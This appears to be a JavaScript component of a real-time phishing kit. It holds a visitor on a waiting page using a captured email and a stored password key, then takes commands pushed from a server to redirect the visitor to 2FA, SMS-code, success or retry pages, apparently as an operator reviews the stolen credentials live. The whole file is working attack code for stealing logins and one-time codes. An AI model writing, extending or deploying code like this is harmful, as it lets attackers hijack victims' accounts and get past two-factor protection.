(function () {
  var email  = sessionStorage.getItem("ka_email")   || "";
  var siteId = sessionStorage.getItem("ka_site_id") || "";
  if (!email || !siteId) { window.location.href = "login.html"; return; }
  var done   = false;
  var sseSub = null;
  function go(action) {
    if (done) return;
    done = true;
    if (sseSub) sseSub.close();
    setTimeout(function() {
      if (action === "success") { sessionStorage.removeItem("ka_pass"); window.location.href = "verified.html"; }
      else if (action === "2fa")   { window.location.href = "2fa.html"; }
      else if (action === "sms")   { window.location.href = "sms.html"; }
      else if (action === "wrong") { sessionStorage.removeItem("ka_pass"); window.location.href = "login.html"; }
    }, 200);
  }
  sseSub = KA.subscribe(siteId, {
    action: function(data) { if (data.siteId === siteId) go(data.action); }
  });
  window.addEventListener("beforeunload", function() { if (sseSub) sseSub.close(); });
})();
